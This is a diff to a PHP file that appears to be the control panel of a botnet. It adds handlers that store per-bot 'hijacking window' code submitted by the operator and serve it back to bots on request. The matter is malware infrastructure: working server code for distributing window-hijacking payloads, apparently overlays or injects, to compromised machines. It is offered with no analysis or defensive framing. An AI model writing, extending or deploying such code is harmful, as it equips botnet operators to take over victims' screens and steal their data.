@@ -138,4 +138,38 @@ elseif(isset($_POST['add_source_spy']) && $_POST['add_source_spy'] != '' && isse
         }
     }
 }
+elseif(isset($_POST['source']) && $_POST['source'] != '' && isset($_POST['z_name']) && $_POST['z_name'] != ''){
+
+    $select_id = $bdd->prepare("SELECT id FROM bots WHERE name = :name");
+    $select_id->bindParam(':name', $_POST['z_name']);
+    $select_id->execute();
+    if($select_id->rowCount() > 0){
+        $ids = $select_id->fetch()['id'];
+        $select = $bdd->prepare("SELECT * FROM hijacking_window WHERE bot_id = :bot_id");
+        $select->bindParam(':bot_id', $ids);
+        $select->execute();
+        if($select->rowCount() < 1){
+            $insert = $bdd->prepare("INSERT INTO hijacking_window(bot_id,windows_code) VALUES(:bot_id, :source)");
+            $insert->bindParam(':bot_id', $ids);
+            $insert->bindParam(':source', $_POST['source']);
+            $insert->execute();
+        }
+        else{
+            $update = $bdd->prepare("UPDATE hijacking_window SET windows_code = :source WHERE bot_id = :bot_id");
+            $update->bindParam(':source', $_POST['source']);
+            $update->bindParam(':bot_id', $ids);
+            $update->execute();
+        }
+    }
+}
+elseif(isset($_GET['hijack_source']) && $_GET['hijack_source'] != '' && isset($_GET['id']) && $_GET['id'] != '')
+{
+        $select = $bdd->prepare("SELECT * FROM hijacking_window WHERE bot_id = :bot_id");
+        $select->bindParam(':bot_id', $_GET['id']);
+        $select->execute();
+        if($select->rowCount() > 0){
+            $fetch = $select->fetch();
+            echo $fetch['windows_code'];
+        }
+}
 ?>
